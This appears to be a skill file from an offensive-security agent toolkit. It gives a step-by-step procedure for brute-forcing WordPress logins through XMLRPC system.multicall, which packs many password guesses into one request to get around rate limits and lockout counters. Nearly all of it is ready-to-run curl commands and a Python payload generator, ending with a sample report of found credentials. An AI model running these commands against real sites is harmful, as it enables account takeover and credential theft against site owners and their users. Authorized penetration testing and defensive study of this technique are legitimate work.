---
name: multicall-bruteforce
description: Chain XMLRPC system.multicall for amplified credential brute force
version: 1.0.0
phase: chains
category: chaining
tags: [xmlrpc, multicall, brute-force, amplification, wordpress]
tools: [curl]
difficulty: intermediate
opsec_level: medium
time_estimate: 5m
severity_if_found: high
related_skills:
  - xmlrpc-exploitation
  - hunt-cors-exploit
mitre_attack:
  - T1110.003
  - T1190
---

## When to Use

Use this skill when WordPress XMLRPC system.multicall is enabled. This allows
sending hundreds of login attempts in a single HTTP request, bypassing
per-request rate limits and login attempt counters.

## Prerequisites

- curl
- WordPress with XMLRPC system.multicall enabled
- Username list or known username
- Password list

## Procedure

```bash
# STEP 1: Confirm system.multicall is enabled
curl -sk -X POST "https://TARGET/xmlrpc.php" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' | grep "system.multicall"

# STEP 2: Test single wp.getUsersBlogs call
curl -sk -X POST "https://TARGET/xmlrpc.php" \
  -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>password123</string></value></param></params></methodCall>'

# STEP 3: Generate multicall brute force payload (50 attempts per request)
python3 -c "
passwords = ['password123','admin','letmein','qwerty','123456']
methods = ''
for p in passwords:
    methods += f'<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>admin</string></value><value><string>{p}</string></value></data></array></value></member></struct></value>'
print(f'<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>{methods}</data></array></value></param></params></methodCall>')
" > /tmp/multicall.xml

# STEP 4: Send multicall brute force request
curl -sk -X POST "https://TARGET/xmlrpc.php" -d @/tmp/multicall.xml

# STEP 5: Parse results — look for valid credentials
curl -sk -X POST "https://TARGET/xmlrpc.php" -d @/tmp/multicall.xml | \
  grep -oE "<string>[^<]+</string>" | head -20

# STEP 6: Amplified attack — multiple users × passwords in one request
curl -sk -X POST "https://TARGET/xmlrpc.php" -d @/tmp/multicall.xml
```

## OPSEC Rules

- **HIGH RISK**: Amplified brute force generates thousands of auth events
- Limit multicall batches to 50 passwords per request
- Stop after finding valid credentials
- Do not use for DoS (large multicalls can crash PHP)
- Document all brute force attempts for audit
- Account lockout may occur — monitor for lockouts

## Verification

- Confirm system.multicall accepts wp.getUsersBlogs
- Verify single attempt works before amplifying
- Test different username/password combinations
- Check if lockout triggers after multicall

## Pitfalls

- PHP max_execution_time may kill large multicalls
- WordPress may rate-limit at application level
- Account lockout may trigger after N failed attempts
- Some WordPress installs disable system.multicall
- Large payloads may hit post_size_limit
- Response parsing may be complex for failed attempts

## Output Format

```
[CHAIN] XMLRPC multicall brute force successful
  Method: system.multicall (amplified)
  Requests sent: 5 (250 password attempts)
  Valid credentials found: admin:password123
  Lockout triggered: No
  Severity: HIGH (8.0)
```
